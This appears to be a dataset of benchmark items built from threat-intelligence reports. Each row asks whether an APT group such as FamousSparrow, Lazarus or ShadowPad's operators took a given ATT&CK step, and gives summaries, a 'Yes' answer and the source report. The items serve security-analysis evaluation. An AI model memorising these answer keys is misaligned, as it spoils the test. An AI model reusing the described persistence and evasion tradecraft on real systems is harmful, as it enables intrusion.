198,121,121-Persistence-T1543-Create or Modify System Process,"After FamousSparrow exploited remote code execution vulnerabilities for Initial Access by dropping and executing SparrowDoor through cmd.exe, is it likely that they achieved Persistence by creating a registry Run key entry and installing SparrowDoor as a service named WSearchIndex?","Persistence: FamousSparrow achieved Persistence by creating a registry Run key entry for SparrowDoor and installing it as a service named WSearchIndex. Additionally, they used DLL search order hijacking to load the malicious K7UI.dll.","Resource Development: The CTI report indicates that the cyberespionage group FamousSparrow engaged in Resource Development by exploiting known remote code execution vulnerabilities in Microsoft Exchange, SharePoint, and Oracle Opera. They used these vulnerabilities to drop various malicious samples. The group also acquired infrastructure such as domains and servers from Hosting Concepts, Shanghai Ruisu Network Technology, and DAOU TECHNOLOGY.
Initial Access: FamousSparrow gained Initial Access by exploiting remote code execution vulnerabilities in Microsoft Exchange, SharePoint, and Oracle Opera, which are internet-facing applications.
Execution: For Execution, FamousSparrow utilized cmd.exe to run commands for downloading and installing the SparrowDoor backdoor. They also exploited the same vulnerabilities used for initial access to execute SparrowDoor on the compromised systems.
Privilege Escalation: The report does not provide specific details on Privilege Escalation techniques used by FamousSparrow.
Defense Evasion: FamousSparrow employed Defense Evasion tactics by injecting the encrypted shellcode MpSvc.dll into processes. They also attempted to adjust token privileges to obtain SeDebugPrivilege and obfuscated files or information, including the shellcode and configuration data within SparrowDoor.
Credential Access: FamousSparrow used a custom version of Mimikatz for Credential Access, aiming to dump credentials from the compromised systems.
Discovery: In the Discovery phase, SparrowDoor collected system information such as usernames, computer names, RDP session IDs, and drive types. It also probed files in specified directories to obtain their names, attributes, sizes, and last modified times.
Collection: FamousSparrow's Collection tactics included the ability to read file contents and exfiltrate them to the C&C server.
Command and Control: For Command and Control, SparrowDoor communicated with the C&C server using the HTTPS protocol and encrypted/decrypted communications with different multi-byte XOR keys.
Exfiltration: FamousSparrow exfiltrated data over the C&C channel using SparrowDoor.",Yes,FamousSparrow_ A suspicious hotel guest _ WeLiveSecurity
201,121,121-Resource Development-T1583-Acquire Infrastructure,"After gaining Initial Access by exploiting remote code execution vulnerabilities in Microsoft Exchange, SharePoint, and Oracle Opera, is it likely that FamousSparrow would acquire infrastructure from Hosting Concepts, Shanghai Ruisu Network Technology, and DAOU TECHNOLOGY for Resource Development before using cmd.exe to download and install the SparrowDoor backdoor?","Resource Development: The CTI report indicates that the cyberespionage group FamousSparrow engaged in Resource Development by exploiting known remote code execution vulnerabilities in Microsoft Exchange, SharePoint, and Oracle Opera. They used these vulnerabilities to drop various malicious samples. The group also acquired infrastructure such as domains and servers from Hosting Concepts, Shanghai Ruisu Network Technology, and DAOU TECHNOLOGY.","Initial Access: FamousSparrow gained Initial Access by exploiting remote code execution vulnerabilities in Microsoft Exchange, SharePoint, and Oracle Opera, which are internet-facing applications.
Execution: For Execution, FamousSparrow utilized cmd.exe to run commands for downloading and installing the SparrowDoor backdoor. They also exploited the same vulnerabilities used for initial access to execute SparrowDoor on the compromised systems.
Persistence: FamousSparrow achieved Persistence by creating a registry Run key entry for SparrowDoor and installing it as a service named WSearchIndex. Additionally, they used DLL search order hijacking to load the malicious K7UI.dll.
Privilege Escalation: The report does not provide specific details on Privilege Escalation techniques used by FamousSparrow.
Defense Evasion: FamousSparrow employed Defense Evasion tactics by injecting the encrypted shellcode MpSvc.dll into processes. They also attempted to adjust token privileges to obtain SeDebugPrivilege and obfuscated files or information, including the shellcode and configuration data within SparrowDoor.
Credential Access: FamousSparrow used a custom version of Mimikatz for Credential Access, aiming to dump credentials from the compromised systems.
Discovery: In the Discovery phase, SparrowDoor collected system information such as usernames, computer names, RDP session IDs, and drive types. It also probed files in specified directories to obtain their names, attributes, sizes, and last modified times.
Collection: FamousSparrow's Collection tactics included the ability to read file contents and exfiltrate them to the C&C server.
Command and Control: For Command and Control, SparrowDoor communicated with the C&C server using the HTTPS protocol and encrypted/decrypted communications with different multi-byte XOR keys.
Exfiltration: FamousSparrow exfiltrated data over the C&C channel using SparrowDoor.",Yes,FamousSparrow_ A suspicious hotel guest _ WeLiveSecurity
205,121,121-Credential Access-T1003-OS Credential Dumping,"Is it likely that FamousSparrow, after utilizing cmd.exe to execute SparrowDoor backdoor for Execution, will collect system information and probe files as part of the Discovery phase before dumping credentials from compromised systems using a custom version of Mimikatz for Credential Access?","Credential Access: FamousSparrow used a custom version of Mimikatz for Credential Access, aiming to dump credentials from the compromised systems.","Resource Development: The CTI report indicates that the cyberespionage group FamousSparrow engaged in Resource Development by exploiting known remote code execution vulnerabilities in Microsoft Exchange, SharePoint, and Oracle Opera. They used these vulnerabilities to drop various malicious samples. The group also acquired infrastructure such as domains and servers from Hosting Concepts, Shanghai Ruisu Network Technology, and DAOU TECHNOLOGY.
Initial Access: FamousSparrow gained Initial Access by exploiting remote code execution vulnerabilities in Microsoft Exchange, SharePoint, and Oracle Opera, which are internet-facing applications.
Execution: For Execution, FamousSparrow utilized cmd.exe to run commands for downloading and installing the SparrowDoor backdoor. They also exploited the same vulnerabilities used for initial access to execute SparrowDoor on the compromised systems.
Persistence: FamousSparrow achieved Persistence by creating a registry Run key entry for SparrowDoor and installing it as a service named WSearchIndex. Additionally, they used DLL search order hijacking to load the malicious K7UI.dll.
Privilege Escalation: The report does not provide specific details on Privilege Escalation techniques used by FamousSparrow.
Defense Evasion: FamousSparrow employed Defense Evasion tactics by injecting the encrypted shellcode MpSvc.dll into processes. They also attempted to adjust token privileges to obtain SeDebugPrivilege and obfuscated files or information, including the shellcode and configuration data within SparrowDoor.
Discovery: In the Discovery phase, SparrowDoor collected system information such as usernames, computer names, RDP session IDs, and drive types. It also probed files in specified directories to obtain their names, attributes, sizes, and last modified times.
Collection: FamousSparrow's Collection tactics included the ability to read file contents and exfiltrate them to the C&C server.
Command and Control: For Command and Control, SparrowDoor communicated with the C&C server using the HTTPS protocol and encrypted/decrypted communications with different multi-byte XOR keys.
Exfiltration: FamousSparrow exfiltrated data over the C&C channel using SparrowDoor.",Yes,FamousSparrow_ A suspicious hotel guest _ WeLiveSecurity
206,121,121-Discovery-T1083-File and Directory Discovery,"After dumping credentials using a custom version of Mimikatz for Credential Access, is FamousSparrow likely to collect system information such as usernames, computer names, RDP session IDs, and drive types during the Discovery phase before reading file contents and exfiltrating them to the C&C server?","Discovery: In the Discovery phase, SparrowDoor collected system information such as usernames, computer names, RDP session IDs, and drive types. It also probed files in specified directories to obtain their names, attributes, sizes, and last modified times.","Resource Development: The CTI report indicates that the cyberespionage group FamousSparrow engaged in Resource Development by exploiting known remote code execution vulnerabilities in Microsoft Exchange, SharePoint, and Oracle Opera. They used these vulnerabilities to drop various malicious samples. The group also acquired infrastructure such as domains and servers from Hosting Concepts, Shanghai Ruisu Network Technology, and DAOU TECHNOLOGY.
Initial Access: FamousSparrow gained Initial Access by exploiting remote code execution vulnerabilities in Microsoft Exchange, SharePoint, and Oracle Opera, which are internet-facing applications.
Execution: For Execution, FamousSparrow utilized cmd.exe to run commands for downloading and installing the SparrowDoor backdoor. They also exploited the same vulnerabilities used for initial access to execute SparrowDoor on the compromised systems.
Persistence: FamousSparrow achieved Persistence by creating a registry Run key entry for SparrowDoor and installing it as a service named WSearchIndex. Additionally, they used DLL search order hijacking to load the malicious K7UI.dll.
Privilege Escalation: The report does not provide specific details on Privilege Escalation techniques used by FamousSparrow.
Defense Evasion: FamousSparrow employed Defense Evasion tactics by injecting the encrypted shellcode MpSvc.dll into processes. They also attempted to adjust token privileges to obtain SeDebugPrivilege and obfuscated files or information, including the shellcode and configuration data within SparrowDoor.
Credential Access: FamousSparrow used a custom version of Mimikatz for Credential Access, aiming to dump credentials from the compromised systems.
Collection: FamousSparrow's Collection tactics included the ability to read file contents and exfiltrate them to the C&C server.
Command and Control: For Command and Control, SparrowDoor communicated with the C&C server using the HTTPS protocol and encrypted/decrypted communications with different multi-byte XOR keys.
Exfiltration: FamousSparrow exfiltrated data over the C&C channel using SparrowDoor.",Yes,FamousSparrow_ A suspicious hotel guest _ WeLiveSecurity
208,121,121-Collection-T1005-Data from Local System,"After SparrowDoor collects system information such as usernames, computer names, and file attributes during the Discovery phase, is it likely that FamousSparrow will read file contents from the compromised systems as part of their Collection tactics before exfiltrating these files to their C&C server?",Collection: FamousSparrow's Collection tactics included the ability to read file contents and exfiltrate them to the C&C server.,"Resource Development: The CTI report indicates that the cyberespionage group FamousSparrow engaged in Resource Development by exploiting known remote code execution vulnerabilities in Microsoft Exchange, SharePoint, and Oracle Opera. They used these vulnerabilities to drop various malicious samples. The group also acquired infrastructure such as domains and servers from Hosting Concepts, Shanghai Ruisu Network Technology, and DAOU TECHNOLOGY.
Initial Access: FamousSparrow gained Initial Access by exploiting remote code execution vulnerabilities in Microsoft Exchange, SharePoint, and Oracle Opera, which are internet-facing applications.
Execution: For Execution, FamousSparrow utilized cmd.exe to run commands for downloading and installing the SparrowDoor backdoor. They also exploited the same vulnerabilities used for initial access to execute SparrowDoor on the compromised systems.
Persistence: FamousSparrow achieved Persistence by creating a registry Run key entry for SparrowDoor and installing it as a service named WSearchIndex. Additionally, they used DLL search order hijacking to load the malicious K7UI.dll.
Privilege Escalation: The report does not provide specific details on Privilege Escalation techniques used by FamousSparrow.
Defense Evasion: FamousSparrow employed Defense Evasion tactics by injecting the encrypted shellcode MpSvc.dll into processes. They also attempted to adjust token privileges to obtain SeDebugPrivilege and obfuscated files or information, including the shellcode and configuration data within SparrowDoor.
Credential Access: FamousSparrow used a custom version of Mimikatz for Credential Access, aiming to dump credentials from the compromised systems.
Discovery: In the Discovery phase, SparrowDoor collected system information such as usernames, computer names, RDP session IDs, and drive types. It also probed files in specified directories to obtain their names, attributes, sizes, and last modified times.
Command and Control: For Command and Control, SparrowDoor communicated with the C&C server using the HTTPS protocol and encrypted/decrypted communications with different multi-byte XOR keys.
Exfiltration: FamousSparrow exfiltrated data over the C&C channel using SparrowDoor.",Yes,FamousSparrow_ A suspicious hotel guest _ WeLiveSecurity
209,121,121-Exfiltration-T1041-Exfiltration Over C2 Channel,"After utilizing SparrowDoor to communicate with the C&C server using the HTTPS protocol and to perform encrypted communications employing multi-byte XOR keys for Command and Control, is FamousSparrow likely to exfiltrate data over the C&C channel using SparrowDoor?",Exfiltration: FamousSparrow exfiltrated data over the C&C channel using SparrowDoor.,"Resource Development: The CTI report indicates that the cyberespionage group FamousSparrow engaged in Resource Development by exploiting known remote code execution vulnerabilities in Microsoft Exchange, SharePoint, and Oracle Opera. They used these vulnerabilities to drop various malicious samples. The group also acquired infrastructure such as domains and servers from Hosting Concepts, Shanghai Ruisu Network Technology, and DAOU TECHNOLOGY.
Initial Access: FamousSparrow gained Initial Access by exploiting remote code execution vulnerabilities in Microsoft Exchange, SharePoint, and Oracle Opera, which are internet-facing applications.
Execution: For Execution, FamousSparrow utilized cmd.exe to run commands for downloading and installing the SparrowDoor backdoor. They also exploited the same vulnerabilities used for initial access to execute SparrowDoor on the compromised systems.
Persistence: FamousSparrow achieved Persistence by creating a registry Run key entry for SparrowDoor and installing it as a service named WSearchIndex. Additionally, they used DLL search order hijacking to load the malicious K7UI.dll.
Privilege Escalation: The report does not provide specific details on Privilege Escalation techniques used by FamousSparrow.
Defense Evasion: FamousSparrow employed Defense Evasion tactics by injecting the encrypted shellcode MpSvc.dll into processes. They also attempted to adjust token privileges to obtain SeDebugPrivilege and obfuscated files or information, including the shellcode and configuration data within SparrowDoor.
Credential Access: FamousSparrow used a custom version of Mimikatz for Credential Access, aiming to dump credentials from the compromised systems.
Discovery: In the Discovery phase, SparrowDoor collected system information such as usernames, computer names, RDP session IDs, and drive types. It also probed files in specified directories to obtain their names, attributes, sizes, and last modified times.
Collection: FamousSparrow's Collection tactics included the ability to read file contents and exfiltrate them to the C&C server.
Command and Control: For Command and Control, SparrowDoor communicated with the C&C server using the HTTPS protocol and encrypted/decrypted communications with different multi-byte XOR keys.",Yes,FamousSparrow_ A suspicious hotel guest _ WeLiveSecurity
211,122,122-Collection-T1560-Archive Collected Data,"After Harvester attempts to blend its malicious command and control activities with legitimate network traffic by leveraging legitimate CloudFront and Microsoft infrastructure, is it likely that the custom screenshot tool will capture user activities, save them as password-protected ZIP archives, and delete any archives older than a week for streamlined collection?",Collection: The custom screenshot tool captures screenshots and saves them to a password-protected ZIP archive for collection. Archives older than a week are deleted.,"Initial Access: The Harvester group, a likely nation-state-backed actor, initiated their campaign in June 2021, targeting organizations in South Asia, particularly Afghanistan. The initial infection vector remains unknown, but the first evidence of Harvester activity was the discovery of a malicious URL on victim machines.
Execution: The Harvester group deployed a custom backdoor named Backdoor.Graphon, along with other tools such as a custom downloader and a custom screenshot tool, to execute commands, capture user activities, and facilitate remote access.
Persistence: The custom downloader sets a registry value to create a loadpoint for persistence: HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\""MicrosoftSystemServices""= ""[ARTEFACTS_FOLDER]\Microsoft Services[.]vbs""
Defense Evasion: Harvester attempted to blend its malicious activities with legitimate network traffic by leveraging legitimate CloudFront and Microsoft infrastructure for command and control (C&C) activities. The group also used a decoy URL, hxxps://usedust[.]com, to confuse affected users.
Command and Control: Harvester used Microsoft infrastructure and CloudFront for its C&C activities, with the custom backdoor Backdoor.Graphon and Cobalt Strike Beacon communicating with C&C servers hosted on Microsoft infrastructure. The attackers controlled their input stream and captured output and error streams, sending encrypted data back to their servers.
Exfiltration: The custom screenshot tool saves captured screenshots to a password-protected ZIP archive for exfiltration.
Others: The Harvester group's campaign is characterized as an espionage effort, with the use of custom backdoors, steps to hide malicious activity, and the targeting of specific sectors and geographies. The group's most recent activity was observed in October 2021. Symantec's Threat Hunter Team, consisting of security experts, investigates targeted attacks and enhances protection in Symantec products.",Yes,Harvester_ Nation-state-backed group uses new toolset to target victims in South Asia _ Symantec Blogs
212,122,122-Command and Control-T1573-Encrypted Channel,"After Harvester's custom screenshot tool captures and archives screenshots for collection, is it likely that the custom backdoor Backdoor.Graphon and Cobalt Strike Beacon will communicate with C&C servers hosted on Microsoft infrastructure and CloudFront using an encrypted channel?","Command and Control: Harvester used Microsoft infrastructure and CloudFront for its C&C activities, with the custom backdoor Backdoor.Graphon and Cobalt Strike Beacon communicating with C&C servers hosted on Microsoft infrastructure. The attackers controlled their input stream and captured output and error streams, sending encrypted data back to their servers.","Initial Access: The Harvester group, a likely nation-state-backed actor, initiated their campaign in June 2021, targeting organizations in South Asia, particularly Afghanistan. The initial infection vector remains unknown, but the first evidence of Harvester activity was the discovery of a malicious URL on victim machines.
Execution: The Harvester group deployed a custom backdoor named Backdoor.Graphon, along with other tools such as a custom downloader and a custom screenshot tool, to execute commands, capture user activities, and facilitate remote access.
Persistence: The custom downloader sets a registry value to create a loadpoint for persistence: HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\""MicrosoftSystemServices""= ""[ARTEFACTS_FOLDER]\Microsoft Services[.]vbs""
Defense Evasion: Harvester attempted to blend its malicious activities with legitimate network traffic by leveraging legitimate CloudFront and Microsoft infrastructure for command and control (C&C) activities. The group also used a decoy URL, hxxps://usedust[.]com, to confuse affected users.
Collection: The custom screenshot tool captures screenshots and saves them to a password-protected ZIP archive for collection. Archives older than a week are deleted.
Exfiltration: The custom screenshot tool saves captured screenshots to a password-protected ZIP archive for exfiltration.
Others: The Harvester group's campaign is characterized as an espionage effort, with the use of custom backdoors, steps to hide malicious activity, and the targeting of specific sectors and geographies. The group's most recent activity was observed in October 2021. Symantec's Threat Hunter Team, consisting of security experts, investigates targeted attacks and enhances protection in Symantec products.",Yes,Harvester_ Nation-state-backed group uses new toolset to target victims in South Asia _ Symantec Blogs
214,123,123-Command and Control-T1102-Web Service,Is it likely that Elirks malware retrieved its command and control (C2) server address by accessing pre-determined microblog services or social networking sites after attackers created accounts on these platforms to post encoded IP addresses or domain names of the actual C2 servers?,"Command and Control: Elirks malware retrieves its command and control (C2) server address by accessing pre-determined microblog services or social networking sites. Attackers create accounts on these platforms and post encoded IP addresses or domain names of the actual C2 servers in advance. Known C2 servers are classified as malicious in PAN-DB, and Palo Alto Networks customers are protected from Elirks variants with WildFire detection and AutoFocus tags.","Initial Access: A recent attack on a Japanese business involved the use of two malware families, PlugX and Elirks. The latter, a basic backdoor Trojan discovered in 2010, is used to steal information from compromised systems. Elirks retrieves its C2 address by accessing a predetermined microblog service or SNS, where attackers post encoded IP addresses or domain names of real C2 servers. A sample found in early 2016 contained embedded URLs from a Japanese blog service, and another sample from 2014 used a similar method, with the attacker's blog account still active.
Others: The Elirks malware was used in a spear-phishing campaign targeting a ministry in Taiwan in May 2012, exploiting Adobe Flash vulnerability CVE-2011-0611 embedded in a PDF to install the malware. Similar tactics were used in the recent Japanese attack, with emails masquerading as legitimate companies and using aviation-related file names to lure targets. While there is no definitive evidence linking the same adversary to the attacks in Japan (2016) and Taiwan (2012), there are similarities in the use of malware, crafted spear-phishing emails, and interest in aviation-related targets. Palo Alto Networks continues to monitor these threat actors.",Yes,unit42-tracking-elirks-variants-in-japan-similarities-to-previous-attacks
227,125,125-Command and Control-T1071-Application Layer Protocol,"After injecting a .NET C2 client into memory to execute the Jupyter infostealer and employing PowerShell scripts for execution, is it likely that the Jupyter infostealer will communicate with a command and control (C2) server, send collected information, and undergo version upgrades as part of its command and control operations?","Command and Control: The Jupyter C2 client communicates with a command and control (C2) server, which has been mapped to Russia in multiple instances. The client uses a well-defined communication protocol and versioning matrix, and it sends collected information from the infected machine to the C2. The C2 client has undergone several version upgrades, indicating the development of an end-to-end framework for the infostealer.","Initial Access: The Jupyter infostealer's attack chain typically begins with a downloaded zip file containing an installer, which often masquerades as legitimate software like Docx2Rtf. These installers have been observed to evade detection by most endpoint security scanning controls, with some maintaining 0 detections on VirusTotal for six months. The installer, upon execution, injects a .NET C2 client (Jupyter Loader) into memory, which then downloads a PowerShell command to execute the in-memory Jupyter .NET module.
Execution: The Jupyter infostealer executes by injecting a .NET C2 client into memory and using PowerShell scripts. It also employs a Process Hollowing technique to inject shellcode into legitimate Windows configuration applications like 'msinfo32.exe'. The PowerShell intermediate loader decrypts a base64 encoded blob and runs another .NET assembly in-memory, which is the actual Jupyter infostealer.
Persistence: Newer versions of the Jupyter infostealer installer have incorporated the PoshC2 persistence method, creating a LNK file in the Windows startup folder to maintain persistence across system restarts.
Defense Evasion: The Jupyter infostealer evades defenses by copying stolen information to another directory before accessing it, thus avoiding triggering alerts. It also uses obfuscation patterns and changes its code structure to evade detection.
Collection: The Jupyter infostealer targets and collects data from Chromium, Firefox, and Chrome browsers, including autocomplete data, cookies, and passwords. It has evolved to also steal information from Firefox, including cookies, logins, certificates, and form history.
Exfiltration: The stolen information from browsers is sent to a configured C2 server, which is different from the loader's C2. The admin panel for the infostealer was still active at the time of writing the report.
Others: Morphisec identified the Jupyter infostealer during an incident response for a higher education customer in the U.S. The infostealer is a .NET variant that demonstrates capabilities beyond data theft, including full backdoor functionality. Morphisec's Moving Target Defense technology is highlighted as a solution that secures customers against unknown attacks like Jupyter without the need for detecting any portion of the attack chain.",Yes,Jupyter Infostealer WEB
230,126,126-Command and Control-T1573-Encrypted Channel,"After utilizing a loader DLL to decrypt and execute an encrypted backdoor in memory for defense evasion, is the Lazarus group likely to have the backdoors connect to command and control servers to receive commands and conduct activities?","Command and Control: The backdoors installed by the Lazarus group connect to command and control servers to receive commands and conduct activities. The servers identified are 107[.]172[.]195[.]20, 92[.]3[.]12[.]154, and 46[.]21[.]147[.]161.","Execution: The Lazarus group, specifically its subgroup Bluenoroff, has been actively targeting financial organizations in Latin America. On September 19, 2018, they successfully installed backdoors on several machines belonging to financial institutions. These backdoors, identified as BKDR_BINLODR.ZNFJ-A, were installed as services and are capable of executing various malicious functions such as collecting information, downloading files, launching or terminating processes, updating configuration data, deleting files, injecting code, utilizing proxies, opening reverse shells, and running in passive mode to receive commands through an open port.
Defense Evasion: The Lazarus group's backdoors are sophisticated and difficult to detect. They employ a complex technique involving three major components: a loader DLL (AuditCred.dll/ROptimizer.dll), an encrypted backdoor (Msadoz<n>.dll), and an encrypted configuration file (Auditcred.dll.mui/rOptimizer.dll.mui). The loader DLL is installed as a service and is responsible for loading the encrypted backdoor to decrypt and execute it in memory. The encrypted configuration file contains the C&C information necessary for the backdoor to connect and conduct its activities. The backdoors are located in different directories, making it harder to detect and remove them.
Others: Trend Micro has identified the Lazarus group as a significant threat to enterprise security. They recommend routine scanning of networks for malicious activity, educating employees on social engineering techniques, and employing a multilayered approach to security, including endpoint hardening and application control. Trend Micro's security solutions, such as Smart Protection Suites, Worry-Free Business Security, Deep Discovery, and XGen security, are designed to detect and block the threats posed by groups like Lazarus.",Yes,blog.trendmicro.com-Lazarus Continues Heists Mounts Attacks on Financial Organizations in Latin America
234,127,127-Execution-T1059-Command and Scripting Interpreter,"After downloading a base64-encoded CAB file from a remote site through a script embedded in a malicious document, is it likely that the malware infection method will use batch files in a multi-step process before using a UAC bypass module to execute the main payload with elevated privileges?","Execution: The malware infection method involved a multi-step process using batch files. Initially, a script in a malicious document would download a base64-encoded text file (1.txt), which is then decoded to create and execute a batch file (1.bat). This batch file would then download additional text files (2.txt for 32-bit or 3.txt for 64-bit systems), which are decoded to create a 'setup.cab' file. The CAB file contained a BAT file for executing the main payload, an INI file with the attacker server address, a DLL file for UAC bypass, and the main EXE payload.","Initial Access: The Threat Recon team from NSHC reported on March 28, 2019, that a threat actor group targeted organizations in South Korea, the US, and East Asia with malware distributed via spear phishing emails. The emails contained malicious documents that, when executed, would download a base64-encoded CAB file from a remote site through a script embedded in the document.
Privilege Escalation: The malware used a specific User Access Control (UAC) bypass module to execute the main payload without triggering a UAC pop-up. This was achieved by copying the INI configuration file and the main payload EXE into the System32 folder, which would normally prompt a UAC pop-up for security reasons. The UAC bypass module was created by referencing the open-source UAC-TokenMagic.ps1 on GitHub and involved creating a wusa.exe process with a High Integrity Level, copying its token, and running cmd.exe with elevated privileges to execute the batch file installing the main payload.
Defense Evasion: The threat actor group utilized a UAC bypass module to prevent the User Account Control (UAC) pop-up from appearing when files were moved to the System32 folder, which is a typical defense mechanism in Windows operating systems. The UAC bypass allowed the malware to execute without alerting the user.
Others: The Threat Recon team identified the use of decoy documents in Russian, English, and Korean languages, and the deployment of malware variants BABYFACE and SYSCON as the main payload. The activities of the threat actor group may be related to previously known groups. Indicators of compromise include SHA-256 hashes and IP addresses associated with the attack.",Yes,Threat Actor Group using UAC Bypass Module to run BAT File
241,128,128-Impact-T1657-Financial Theft,"After using the trojanized Celas Trade Pro application with a hidden 'autoupdater' module to persist on the system and communicate with the command and control server, is the Lazarus group likely to compromise a cryptocurrency exchange through their AppleJeus campaign for financial theft?","Impact: The Lazarus group's operation, named AppleJeus, resulted in the successful compromise of a cryptocurrency exchange, demonstrating the group's continued focus on financial targets and the evolution of their strategies.","Initial Access: The Lazarus group targeted a cryptocurrency exchange by sending an email to an employee, who then downloaded a trojanized cryptocurrency trading application from a seemingly legitimate website. The application, Celas Trade Pro, was later found to contain the Fallchill malware.
Execution: The trojanized Celas Trade Pro application for Windows and macOS contained an updater module that executed upon installation and system reboot, collecting victim host information and sending it back to the attackers' server. The Windows version used a unique identifier and gathered OS version details from the registry, while the macOS version collected basic system information using QT framework classes.
Persistence: The malware installed a hidden 'autoupdater' module that persisted on the system and communicated with the command and control server to download and execute additional payloads.
Defense Evasion: The attackers used a legitimate-looking application and website to distribute the malware. The updater module contained a valid digital signature, making it appear trustworthy. The malware also used encryption and mimicked legitimate network traffic to avoid detection.
Command and Control: The malware communicated with a command and control server using HTTP and a hardcoded User-Agent string. The server responses dictated whether the updater should remain dormant or proceed with downloading and decrypting the payload.
Others: The Lazarus group has expanded its operations to include macOS malware, indicating a focus on platforms used by software developers and high-profile targets. The group's use of a fake business and software update mechanism suggests a sophisticated approach to supply chain attacks. The digital certificates used by the malware did not guarantee the absence of backdoors, highlighting the need for businesses to verify the trustworthiness of third-party software.",Yes,Operation_AppleJeus
245,13,13-Initial Access-T1190-Exploit Public-Facing Application,"Before the exploitation of CVE-2018-0798 through the malicious RTF document for initial access, is it likely that a document appearing to be sent by the Cabinet of Cambodia and containing a list of government officials was created to lure victims, and that after gaining initial access, the file 'OSEA54d.tmp' was used to drop additional malicious files into system directories?","Initial Access: On August 28, 2019, an RTF document was created and uploaded to VirusTotal on September 11, 2019. This document, written in Khmer, appeared to be sent by the Cabinet of Cambodia and listed names of government officials. It was designed to exploit CVE-2018-0798, a stack buffer overflow vulnerability, to execute a file named 'OSEA54d.tmp' located in the 'C:\Users\[username]\AppData\Local\Temp' directory.","Execution: The 'OSEA54d.tmp' file subsequently dropped 'GoogleUpdate.exe' (hash: 7b973145f7e1b59330ca4dd1f86b3d55) into 'C:\Windows\System32\spool\drivers\color\'. This executable was actually CertUtil.exe, a legitimate Microsoft utility. Additionally, a .vbs script named 'Photo.vbs' was created in the same directory to facilitate the download of a file named after the user's computer name with a .png extension, which was then saved as a .tmp file in the user's local temp folder.
Persistence: Two scheduled tasks were created for persistence: 'Google-Updates' and 'Google-Update'. The former used 'msiexec' to execute the downloaded payload '[ComputerName].tmp' every minute, while the latter ran 'Photo.vbs' every two minutes.
Defense Evasion: The attackers used a legitimate Microsoft utility, CertUtil.exe, disguised as 'GoogleUpdate.exe' to evade detection and download additional payloads.
Command and Control: The command and control mechanism involved the use of an IP address (167.71.237.100) to serve a second stage payload, which was not retrieved during the analysis due to HTTP 404 responses.
Others: The RTF document targeted South East Asian entities and was suspected to be part of a campaign by Rancor APT, a Chinese APT group identified by PaloAlto in 2017. The document contained a list of names and appeared official, likely as a lure for espionage purposes. The final payload was not available for analysis, but it was likely to be DDKONG or PLAINTEE malware, which serve as backdoors for file manipulation and command execution. The TTPs observed suggest a high degree of confidence that the activity is related to Rancor APT.",Yes,RANCOR APT_ Suspected targeted attacks against South East Asia
251,130,130-Command and Control-T1659-Content Injection,"After ShadowPad achieves persistence using a Windows service and a registry Run key, is it likely that the malware will inject its payload into a target process as part of its command and control operation?","Command and Control: ShadowPad samples sharing behavioral similarities such as injecting the decrypted ShadowPad payload into a newly launched target process and establishing persistence on a compromised host specified in the configuration settings. Figure 1 lists configuration information for a ShadowPad sample that reveals command and control (C2) details, the process injection target, and persistence via creation of a service and a registry Run key.","Initial Access: The ShadowPad advanced modular remote access trojan (RAT) has been deployed by the Chinese government-sponsored BRONZE ATLAS threat group since at least 2017. Secureworks Counter Threat Unit (CTU) researchers discovered that ShadowPad payloads are deployed to a host either encrypted within a DLL loader or within a separate file alongside a DLL loader. These DLL loaders decrypt and execute ShadowPad in memory after being sideloaded by a legitimate executable vulnerable to DLL search order hijacking. The majority of ShadowPad samples analyzed were two-file execution chains: an encrypted ShadowPad payload embedded in a DLL loader. ShadowPad DLL loaders are sideloaded by a legitimate executable vulnerable to DLL search order hijacking. The DLL loader then decrypts and executes the embedded ShadowPad payload in memory using a custom decryption algorithm specific to the malware version. CTU researchers identified ShadowPad execution chains involving a third file that contains the encrypted ShadowPad payload. These chains execute the legitimate executable (usually renamed), sideload the ShadowPad DLL loader, and load and decrypt the third file. CTU researchers observed threat actors using BDReinit.exe or Oleview.exe as initial files in the three-file ShadowPad execution chain. The third file in the BDReinit.exe execution chain is log.dll.dat; in the Oleview.exe execution chain, it is iviewers.dll.dat. CTU researchers have attributed campaigns using these execution chains to the Chinese BRONZE UNIVERSITY threat group, which has targeted transportation, natural resource, energy, and non-governmental organizations. Third-party researchers have also identified three-file ShadowPad execution chains that begin with consent.exe (followed by secur32.dll and secur32.dll.dat) and AppLaunch.exe (followed by mscoree.dll and mscoree.dll.dat). Additionally, CTU analysis revealed a sample that used AppLaunch.exe followed by mscoree.dll and mscoree.dll.mui.
Execution: ShadowPad is decrypted in memory using a custom decryption algorithm. CTU researchers have identified multiple ShadowPad versions based on these distinct algorithms. ShadowPad extracts information about the host, executes commands, interacts with the file system and registry, and deploys new modules to extend functionality. As part of the execution chain, ShadowPad copies the legitimate binary and sideloaded DLL to a subdirectory specific to each sample. Most analyzed samples were copied to a subdirectory under C:\ProgramData, C:\Users\<username>\Roaming, or C:\Program Files. In three-file execution chains, the third file (e.g., log.dll.dat, iviewers.dll.dat) is typically deleted and the ShadowPad DLL loader is padded to over 50MB, likely to evade antivirus software. As part of this process, an encrypted payload is usually saved to a registry key under HKLM\SOFTWARE\Classes\CLSID\{GUID}\<eight-character hexadecimal string>. After the initial setup the legitimate executable is launched as a Windows service. This service initiates the ShadowPad execution chain. The ShadowPad payload is injected into a child process of the service process that is specified in the ShadowPad configuration information.
Persistence: ShadowPad establishes persistence on a compromised host specified in the configuration settings. Persistence is achieved via creation of a service and a registry Run key. The Windows service that launches the legitimate executable from the subdirectory initiates the ShadowPad execution chain, ensuring that the malware remains active even after system restarts or interruptions.
Defense Evasion: ShadowPad samples from 2018 deviated from the typical two-file execution chain. Those samples, which used the filename TSVIPSrv.DLL, are placed in the Windows System32 directory and are loaded by the Windows SessionEnv Service, which is vulnerable to DLL hijacking. CTU researchers observed BRONZE ATLAS using this technique in 2021 to load other payloads via this filename, including Cobalt Strike. In three-file execution chains, the third file is typically deleted and the ShadowPad DLL loader is padded to over 50MB, likely to evade antivirus software.
